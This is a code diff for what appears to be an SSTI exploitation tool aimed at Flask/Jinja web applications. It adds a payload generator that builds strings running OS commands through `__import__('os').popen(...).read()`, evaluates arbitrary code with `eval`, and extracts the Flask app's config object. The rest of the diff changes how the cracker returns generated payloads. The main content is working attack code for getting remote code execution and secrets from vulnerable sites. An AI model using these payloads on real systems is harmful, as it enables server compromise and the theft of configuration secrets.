@@ -16,8 +16,10 @@ from .const import (
     ATTRIBUTE,
     CHAINED_ATTRIBUTE_ITEM,
     ENVIRONMENT_FLASK,
-    EVAL,
     LITERAL,
+    STRING,
+    CONFIG,
+    EVAL,
     OS_POPEN_READ,
     DETECT_MODE_ACCURATE,
     REPLACED_KEYWORDS_STRATEGY_IGNORE,
@@ -28,6 +30,19 @@ from .full_payload_gen import FullPayloadGen
 logger = logging.getLogger("cracker")
 Result = namedtuple("Result", "full_payload_gen input_field")
 
+
+class EvalArgsModePayloadGen:
+    def __init__(self, will_print):
+        self.will_print = will_print
+    def generate(self, gen_type, *args):
+        if gen_type == OS_POPEN_READ:
+            return f"__import__('os').popen({repr(args[0])}).read()", self.will_print
+        elif gen_type == EVAL:
+            assert args[0] == STRING, "Only eval string is supported"
+            return f"eval({repr(args[1])})", self.will_print
+        elif gen_type == CONFIG:
+            return "[v.config for v in sys.modules['__main__'].__dict__.values() if isinstance(v, sys.modules['flask'].Flask)][0]", self.will_print
+        return None, None
 
 class Cracker:
     """
@@ -118,7 +133,7 @@ class Cracker:
         for _ in range(10):
             content = random.choice(ascii_lowercase) * 6
             resp = self.subm.submit(content)
-            assert resp is not None, "Submit failed"
+            assert resp is not None, "HTTP Failed"
             if content in resp.text:
                 return True
         return False
@@ -164,6 +179,7 @@ class Cracker:
             Union[Tuple[FullPayloadGen, Submitter, bool], None]:
                 产生的payload生成器，提交器，以及是否会产生回显
         """
+        args_target_field = "x"
         logger.info("Cracking with request GET args...")
         assert isinstance(
             self.subm, FormSubmitter
@@ -172,7 +188,6 @@ class Cracker:
         full_payload_gen = FullPayloadGen(
             waf_func, callback=None, detect_mode=self.detect_mode
         )
-        args_target_field = "x"
         payload, will_print = full_payload_gen.generate(
             EVAL,
             (
@@ -218,4 +233,4 @@ class Cracker:
                 + "You can try generating payloads anyway.",
             )
 
-        return full_payload_gen, new_subm, will_print
+        return new_subm, EvalArgsModePayloadGen(will_print)
